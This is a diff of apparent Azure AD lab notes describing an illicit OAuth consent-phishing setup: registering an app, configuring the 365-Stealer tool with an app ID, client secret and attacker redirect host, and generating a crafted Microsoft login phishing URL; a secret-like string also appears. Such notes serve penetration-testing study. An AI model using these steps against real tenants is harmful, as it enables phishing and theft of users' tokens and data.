@@ -215,7 +215,7 @@ Connect-MgGraph -AccessToken ($Token | ConvertTo-SecureString -AsPlainText -Forc
 Tools>(Get-MgPolicyAuthorizationPolicy).DefaultUserRolePermissions.PermissionGrantPoliciesAssigned
 ```
 
-### Step 1 - make the app
+#### Step 1 - make the app
 
 - goto portal.azure.com
 
@@ -233,3 +233,27 @@ _Qb8Q~yaLVJW5Y1li3dtzyES8j1fQp7j43xfjctR
   - now API Permissions - User.Read is there, lets add some good ones
     - MS Graph, Delegated permissions, User.ReadBasic.All 
     - (have to have admin to be able to consent for Application permissions)
+
+#### Step 2 - ready the handler/listener
+We need to ready the attacker VM for incoming redirects that we are going to phish out
+
+- Run xampp to launch webserver
+- Copy the '365-Stealer' directory from C:\AzAD\Tools directory to C:\xampp\htdocs
+- navigate to:- http://localhost:82/365-stealer/yourVictims
+- click on 365 stealer configuration 
+  - need to provide the app ID and client secret (from before in the azure portal blade)
+  - and:
+```
+https://172.16.151.213/login/authorized
+/
+blank
+
+blank
+1
+```
+- save config
+- run 365 stealer
+- this has now provided us with the phishing URL we need for later:
+```
+https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=9e10a3bc-7cfa-407c-8ec9-8b04a3f2cd45&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.151.213%2Flogin%2Fauthorized&response_mode=query
+```
